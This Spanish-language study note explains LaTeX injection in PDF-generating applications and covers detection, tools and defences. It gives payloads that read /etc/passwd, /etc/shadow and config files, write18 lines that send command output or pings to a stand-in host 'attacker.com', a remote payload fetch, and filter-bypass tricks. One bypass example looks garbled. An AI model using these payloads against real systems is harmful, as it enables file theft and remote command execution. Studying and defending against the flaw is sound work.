
---
Tags: #rce #pdf #web #latex #injection

---
# Definición
## ✅ ¿Qué es una LaTeX Injection?

> [[Latex Injection]] es una vulnerabilidad que ocurre cuando una aplicación permite al usuario insertar código LaTeX que luego es compilado sin validación.  
> Esto puede permitir **la ejecución de comandos arbitrarios**, **lectura de archivos**, **inyección de comandos de LaTeX peligrosos**, o incluso **RCE** (ejecución remota de comandos) en algunos entornos mal configurados.

---

## 🔍 ¿Dónde se encuentra?

Esta vulnerabilidad es común en:

- Aplicaciones que **generan PDFs automáticamente** usando LaTeX (por ejemplo, formularios, informes, CVs).
    
- Servicios como **Overleaf**, **MathJax**, **PDF generators** (como `pdflatex`, `lualatex`, etc).
    
- Sitios que **renderizan fórmulas** o contenido ingresado por el usuario usando LaTeX sin escape ni sanitización.
    

---

## 🧪 Ejemplo básico

Si un campo como "nombre" se inserta directamente en una plantilla `.tex` como:

```text
\textbf{Name:} {{nombre_usuario}}
```

Y el usuario introduce:
```latex
\input{/etc/passwd}
```

El archivo `/etc/passwd` será incluido en el PDF generado.

---

## 🛠️ Comandos peligrosos en LaTeX

|Comando|Descripción|Peligroso por|
|---|---|---|
|`\input{file}`|Incluye el contenido de un archivo|Lectura arbitraria de archivos|
|`\include{file}`|Similar a `\input`, pero más estructurado|Lectura arbitraria|
|`\write18{cmd}`|Ejecuta comandos en el sistema (si está habilitado)|RCE potencial|
|`\openin`, `\read`|Lectura de archivos|Exfiltración de contenido|
|`\catcode`|Cambia el significado de caracteres|Bypass de filtros|
|`\def`, `\newcommand`|Definición de macros|Manipulación de lógica del documento|
|`\immediate`|Fuerza ejecución inmediata de instrucciones|Bypass de secuencias|
|`\special`|Envío de comandos al backend del driver|Explotación PDF|

---

## 🧨 Payloads de ejemplo

### 🗂️ Leer archivos

```latex
\input{/etc/passwd}
```

```latex
\include{/var/www/html/config.php}
```

### 💣 RCE con `\write18` (solo si está habilitado)

```latex
\immediate\write18{curl http://attacker.com/`id`}
```

> ⚠️ `\write18` solo funciona si la opción `--shell-escape` está habilitada en la compilación (`pdflatex --shell-escape archivo.tex`)

---

## 🔍 Cómo detectar LaTeX Injection

|Método|Descripción|
|---|---|
|Inyectar comandos como `\input{}` y ver si el contenido aparece en el PDF||
|Usar `\input{http://attacker.com}` y observar tráfico en el servidor||
|Forzar errores de compilación con comandos como `\newcommand{}`||
|Buscar plantillas `.tex` donde se inserten variables directamente||
|Probar payloads especiales para forzar salida no esperada||

---

## 🧰 Herramientas útiles

|Herramienta|Uso|
|---|---|
|**Burp Suite**|Interceptar y modificar formularios|
|**Responder**|Ver si hay tráfico hacia un servidor externo|
|**Ngrok / RequestBin**|Capturar llamadas salientes de `\write18`|
|**pdflatex / lualatex**|Pruebas locales con payloads|
|**LaTeX Sandboxes**|Para probar macros sin afectar tu sistema|

---

## 🔐 Técnicas de bypass

|Técnica|Ejemplo|Objetivo|
|---|---|---|
|**Cambiar `catcode`**|`\catcode`@=11`|Evitar detección de comandos|
|**Hex escapes**|`\input{"7fetc7fpasswd"}`|Bypass de filtrado de rutas|
|**Uso de macros**|`\def\cmd{\input{/etc/passwd}}\cmd`|Ocultar payloads|
|**Espacios Unicode / comentario**|`\input %\n{/etc/passwd}`|Evadir sanitización simple|

---

## 🧱 Cómo protegerse

|Medida|Descripción|
|---|---|
|Escapar todos los datos del usuario antes de insertarlos en plantillas `.tex`||
|No habilitar `--shell-escape` ni `write18`||
|Usar un motor LaTeX restringido como `tectonic` o `latexmk` con flags seguros||
|Validar y limpiar entradas de usuario||
|Reemplazar plantillas LaTeX con motores de PDF más seguros si es posible||
|Usar entornos de sandboxing (Docker, AppArmor) para ejecutar compiladores||

---

## 🧪 Tabla de vectores y ejemplos

|Vector|Tipo|Ejemplo|
|---|---|---|
|File inclusion|`\input{}`|`\input{/etc/passwd}`|
|RCE|`\write18{}`|`\immediate\write18{curl attacker}`|
|Error-based|`\newcommand{\x}[}`|Error de compilación|
|Sandbox escape|`\catcode`@=11`|Redefinir comportamiento|
|Macro abuse|`\def\cmd{\input{/etc/shadow}}\cmd`|Encapsular payload|
|External fetch|`\input{http://attacker.com/payload.tex}`|LFI/XXE-like|

---

## 💥 Práctica rápida

### 1. Payload básico

```latex
\input{/etc/passwd}
```
### 2. Detectar si `write18` está activo:

```latex
\immediate\write18{ping -c 1 attacker.com}
```

Monitorea el servidor para ver si se activa.

---
# Referencias
- PayloadsAllTheThings: [Enlace](https://swisskyrepo.github.io/PayloadsAllTheThings/LaTeX%20Injection/)
- 